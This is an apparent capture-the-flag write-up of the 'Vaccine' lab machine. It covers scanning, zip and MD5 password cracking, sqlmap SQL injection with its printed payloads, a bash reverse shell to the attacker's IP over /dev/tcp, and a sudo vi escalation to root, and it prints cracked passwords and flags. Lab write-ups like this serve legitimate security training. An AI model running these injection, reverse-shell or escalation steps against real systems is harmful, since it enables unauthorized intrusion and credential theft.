# Vaccine

|     Local    |     Remote    |
| ------------ | ------------- |
| 10.10.15.104 | 10.129.248.107 |
| 10.10.14.7   | 10.129.166.104 |
|              |  |

---

## Nmap
```
nmap 10.129.248.107
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-12 20:49 EDT
Nmap scan report for 10.129.248.107
Host is up (0.058s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

```
nmap -Pn -sSVC -O -p 21,22,80 10.129.248.107
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-12 20:50 EDT
Nmap scan report for 10.129.248.107
Host is up (0.048s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c0:ee:58:07:75:34:b0:0b:91:65:b2:59:56:95:27:a4 (RSA)
|   256 ac:6e:81:18:89:22:d7:a7:41:7d:81:4f:1b:b8:b2:51 (ECDSA)
|_  256 42:5b:c3:21:df:ef:a2:0b:c9:5e:03:42:1d:69:d0:28 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.41 seconds
```

### Review & Summary
1. Ran a searchsploit on vsftpd, OpenSSH, and Apache: nada
2. Need some more enumeration...

---

## HTTP Enumeration

Opened the webpage: It's a login page for "MegaCorp Login"

### NSE

#### banner & enum (same results)
```
map -Pn -sV -p 80 --script banner 10.129.248.107
nmap -Pn -sV -p 80 --script http-enum 10.129.248.107
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-12 20:58 EDT
Nmap scan report for 10.129.248.107
Host is up.

PORT   STATE    SERVICE VERSION
80/tcp filtered http
```

#### http-headers
```
nmap -Pn -sV -p 80 --script http-headers 10.129.248.107
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-12 20:58 EDT
Nmap scan report for 10.129.248.107
Host is up (0.048s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-headers: 
|   Date: Mon, 13 May 2024 00:58:46 GMT
|   Server: Apache/2.4.41 (Ubuntu)
|   Set-Cookie: PHPSESSID=ilrrij5nq492jr9cvopvmhnaei; path=/
|   Expires: Thu, 19 Nov 1981 08:52:00 GMT
|   Cache-Control: no-store, no-cache, must-revalidate
|   Pragma: no-cache
|   Connection: close
|   Content-Type: text/html; charset=UTF-8
|   
|_  (Request type: HEAD)
```

#### http-methods
```
nmap -Pn -sV -p 80 --script http-methods 10.129.248.107
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-12 20:59 EDT
Nmap scan report for 10.129.248.107
Host is up (0.048s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
```

### Dir Busting

#### GoBuster
```
gobuster dir -u http://10.129.248.107 -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.248.107
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 279]
/.htpasswd            (Status: 403) [Size: 279]
/.htaccess            (Status: 403) [Size: 279]
/index.php            (Status: 200) [Size: 2312]
/server-status        (Status: 403) [Size: 279]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

---

## FTP

### Anonymous Login: ftp-anon
```
nmap -Pn -sV -p 21 --script ftp-anon 10.129.248.107 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-12 21:06 EDT
Nmap scan report for 10.129.248.107
Host is up (0.048s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
Service Info: OS: Unix
```

### Login as Anonymous
```
ftp 10.129.248.107
Connected to 10.129.248.107.
220 (vsFTPd 3.0.3)
Name (10.129.248.107:greg): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```

Run an `ls` to see what you get...
```
ftp> pwd
Remote directory: /
ftp> ls
229 Entering Extended Passive Mode (|||10130|)
150 Here comes the directory listing.
-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
```

Download that file: 
```
ftp> get backup.zip
local: backup.zip remote: backup.zip
229 Entering Extended Passive Mode (|||10507|)
150 Opening BINARY mode data connection for backup.zip (2533 bytes).
100% |***************************************************************************************************************|  2533        2.30 MiB/s    00:00 ETA
226 Transfer complete.
```

Tried to unzip it and it's password protected.
```
unzip backup.zip 
Archive:  backup.zip
[backup.zip] index.php password: 
   skipping: index.php               incorrect password
   skipping: style.css               incorrect password
```

## Crack the Zip File Password

### Convert the Zip Password to John Format
```
zip2john backup.zip > zip.hash
```

### Crack It
```
john zip.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
741852963        (backup.zip)     
1g 0:00:00:00 DONE 2/3 (2024-05-12 21:19) 14.28g/s 1097Kp/s 1097Kc/s 1097KC/s 123456..ferrises
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

### Show It
```
john --show zip.hash 
backup.zip:741852963::backup.zip:style.css, index.php:backup.zip

1 password hash cracked, 0 left
```

### Unzip the Zip File
```
unzip backup.zip 
Archive:  backup.zip
[backup.zip] index.php password: [741852963]
  inflating: index.php               
  inflating: style.css

ls -l
total 16
-rw-r--r-- 1 greg greg 2533 Apr 13  2021 backup.zip
-rw-r--r-- 1 root root 2594 Feb  3  2020 index.php
-rw-r--r-- 1 root root 3274 Feb  3  2020 style.css
-rw-r--r-- 1 root root 2174 May 12 21:16 zip.hash
```

## grep for goodies
```
grep -rnw ./ -e "password" 2>/dev/null
./index.php:4:  if(isset($_POST['username']) && isset($_POST['password'])) {
./index.php:5:    if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {
./index.php:34:        <input id="login__password" type="password" name="password" class="form__input" placeholder="Password" required>
./style.css:123:.form input[type='password'],
./style.css:151:.login input[type='password'],
./style.css:168:.login input[type='password'],
./style.css:175:.login input[type='password']:focus,
./style.css:176:.login input[type='password']:hover,
```

It looks like the **admin** password is hashed as an md5: `2cb42f8734ea607eefed3b70af13bbd3'

## Crack it with [Hashcat](../../hashcat.md)
```
hashcat -a 0 -m 0 -o cracked_admin.txt admin_pwd.txt /usr/share/wordlists/rockyou.txt
cat cracked_admin.txt 
2cb42f8734ea607eefed3b70af13bbd3:qwerty789
```
- It works: I used it to sign into the webpage... 

## Web Page
> http://10.129.166.104/

Use the username and password to login.
- You get a table of data which means you have a database behind the website.
- There is a search box and if you searm on a term (whatever), you'll see there is a variable `search` in the URL.

Use **Burp Suite** to capture the GET from the search you sent.
- You'll see in the first line the parameter/variable: `search`
- You'll see the Cookie: PHPSESSID=gtn7bvir60u6kq78qljr4dhn29

## SQLMap

### Search for Vulnerabilities

Use **sqlmap** to check for vulnerabilities using the URL for the search and the cookie: 
```
sqlmap -u "http://10.129.166.104/dashboard.php?search=whatever" --cookie="PHPSESSID=gtn7bvir60u6kq78qljr4dhn29"
```

**Results:**

Key line: `GET parameter 'search' is vulnerable. Do you want to keep testing the others (if any)? [y/N]`

```
[*] starting @ 14:14:01 /2024-06-22/

[14:14:01] [INFO] testing connection to the target URL
[14:14:01] [INFO] testing if the target URL content is stable
[14:14:02] [INFO] target URL content is stable
[14:14:02] [INFO] testing if GET parameter 'search' is dynamic
[14:14:02] [WARNING] GET parameter 'search' does not appear to be dynamic
[14:14:02] [INFO] heuristic (basic) test shows that GET parameter 'search' might be injectable (possible DBMS: 'PostgreSQL')
[14:14:02] [INFO] testing for SQL injection on GET parameter 'search'
it looks like the back-end DBMS is 'PostgreSQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] 

for the remaining tests, do you want to include all tests for 'PostgreSQL' extending provided level (1) and risk (1) values? [Y/n] 

[14:14:05] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[14:14:06] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[14:14:06] [INFO] testing 'Generic inline queries'
[14:14:06] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[14:14:07] [INFO] GET parameter 'search' appears to be 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)' injectable 
[14:14:07] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[14:14:07] [INFO] GET parameter 'search' is 'PostgreSQL AND error-based - WHERE or HAVING clause' injectable 
[14:14:07] [INFO] testing 'PostgreSQL inline queries'
[14:14:07] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[14:14:07] [WARNING] time-based comparison requires larger statistical model, please wait....... (done)                                                   
[14:14:19] [INFO] GET parameter 'search' appears to be 'PostgreSQL > 8.1 stacked queries (comment)' injectable 
[14:14:19] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[14:14:30] [INFO] GET parameter 'search' appears to be 'PostgreSQL > 8.1 AND time-based blind' injectable 
[14:14:30] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
GET parameter 'search' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 

sqlmap identified the following injection point(s) with a total of 34 HTTP(s) requests:
---
Parameter: search (GET)
    Type: boolean-based blind
    Title: PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)
    Payload: search=whatever' AND (SELECT (CASE WHEN (7722=7722) THEN NULL ELSE CAST((CHR(99)||CHR(100)||CHR(108)||CHR(73)) AS NUMERIC) END)) IS NULL-- tZue

    Type: error-based
    Title: PostgreSQL AND error-based - WHERE or HAVING clause
    Payload: search=whatever' AND 8836=CAST((CHR(113)||CHR(122)||CHR(107)||CHR(122)||CHR(113))||(SELECT (CASE WHEN (8836=8836) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(106)||CHR(112)||CHR(112)||CHR(113)) AS NUMERIC)-- wEvI

    Type: stacked queries
    Title: PostgreSQL > 8.1 stacked queries (comment)
    Payload: search=whatever';SELECT PG_SLEEP(5)--

    Type: time-based blind
    Title: PostgreSQL > 8.1 AND time-based blind
    Payload: search=whatever' AND 1745=(SELECT 1745 FROM PG_SLEEP(5))-- ClEM
---
[14:15:27] [INFO] the back-end DBMS is PostgreSQL
[14:15:29] [WARNING] turning off pre-connect mechanism because of connection reset(s)
[14:15:29] [CRITICAL] connection reset to the target URL. sqlmap is going to retry the request(s)
web server operating system: Linux Ubuntu 20.10 or 20.04 or 19.10 (focal or eoan)
web application technology: Apache 2.4.41
back-end DBMS: PostgreSQL
[14:15:30] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/10.129.166.104'

[*] ending @ 14:15:30 /2024-06-22/
```

### Exploit with `--os-shell` Option

Same command as the vulnerability scan; just add on the option at the end:

```
sqlmap -u "http://10.129.166.104/dashboard.php?search=whatever" --cookie="PHPSESSID=gtn7bvir60u6kq78qljr4dhn29" --os-shell
```

That gives you an `os-shell>` prompt. I am the postgres user:
```
os-shell> whoami
[14:21:14] [INFO] retrieved: 'postgres'
```

Use this (crappy) access to get a Bash reverse shell on your attack machine: 
1. Set up a listener on your attack machine: `nc -lvnp 1234`
2. Send a bash shell to your attack machine from the target:
```
bash -c "bash -i >& /dev/tcp/[attack ip]/1234 0>&1"
# mine:
bash -c "bash -i >& /dev/tcp/10.10.14.7/1234 0>&1"
```

Make the shell fully interactive (this sucked; I ended up just using the shell from above): 
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
CTRL+Z
stty raw -echo
fg
export TERM=xterm
```

From the walkthrough...

He wanted to `sudo -l` but didn't have a password. So...
- Since you have PHP and SQL, he said you should find passwords in plain text in `/var/www/html`
- So I `cd` into that directory and `grep` for the word "password" in all the files.
- Result:
```
./dashboard.php:41:       $conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
```

If your shell dies on you, use the above username and password to ssh into the target.

Now you can do your `sudo -l` with the postres password. Results: 
```
User postgres may run the following commands on vaccine:
    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

You can run vi in sudo to edit that .conf file. So... 
- You can abuse this privilege: https://gtfobins.github.io/gtfobins/vi/#sudo
- That says: If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.
```
sudo vi -c ':!/bin/sh' /dev/null
```

Doesn't work. Alternative method (same site):
```
vi
:set shell=/bin/sh
:shell
```

So use vi to open the file you're allowed to open, and run the `set` and `shell` commands.
```
sudo vi /etc/postgresql/11/main/pg_hba.conf
```

That gives you a root shell.
- `cd` into the /root dor and find the root.txt. Flag.
```
# cd /root
# ls -la
total 52
drwx------  7 root root 4096 Jun 22 18:55 .
drwxr-xr-x 20 root root 4096 Oct 11  2021 ..
lrwxrwxrwx  1 root root    9 Feb  4  2020 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Aug 27  2019 .bashrc
drwx------  2 root root 4096 Jul 23  2021 .cache
drwx------  3 root root 4096 Jul 23  2021 .gnupg
drwxr-xr-x  3 root root 4096 Jul 23  2021 .local
-rw-r-----  1 root root 4659 Feb  4  2020 pg_hba.conf
-rw-r--r--  1 root root  148 Aug 27  2019 .profile
-rw-------  1 root root   33 Feb 25  2020 root.txt
drwxr-xr-x  3 root root 4096 Jul 23  2021 snap
drwx------  2 root root 4096 Jul 23  2021 .ssh
-rw-------  1 root root  828 Jun 22 18:55 .viminfo
# cat root.txt
dd6e058e814260bc70e9bbdef2715849
```

The user shell was in the postgres user dir: 
```
# pwd
/var/lib/postgresql/11
# cd ..
l# s -la
total 36
drwxr-xr-x  7 postgres postgres 4096 Jun 22 18:55 .
drwxr-xr-x 39 root     root     4096 Jul 23  2021 ..
drwxr-xr-x  3 postgres postgres 4096 Jul 23  2021 11
lrwxrwxrwx  1 root     root        9 Feb  4  2020 .bash_history -> /dev/null
drwx------  2 postgres postgres 4096 Jun 22 18:46 .cache
drwx------  3 postgres postgres 4096 Jun 22 18:46 .gnupg
drwxrwxr-x  3 postgres postgres 4096 Jul 23  2021 .local
lrwxrwxrwx  1 root     root        9 Feb  4  2020 .psql_history -> /dev/null
drwx------  2 postgres postgres 4096 Jul 23  2021 .ssh
-r--------  1 postgres postgres   33 Oct 11  2021 user.txt
-rw-------  1 postgres postgres  916 Jun 22 18:55 .viminfo
# cat user.txt
ec9b13ca4d6229cd5cc1e09980965bf7
```

![image](https://github.com/GregKedrovsky/Hacking/assets/26492233/11b13fd4-7a98-4e4a-bde7-e7e3f4c5488e)

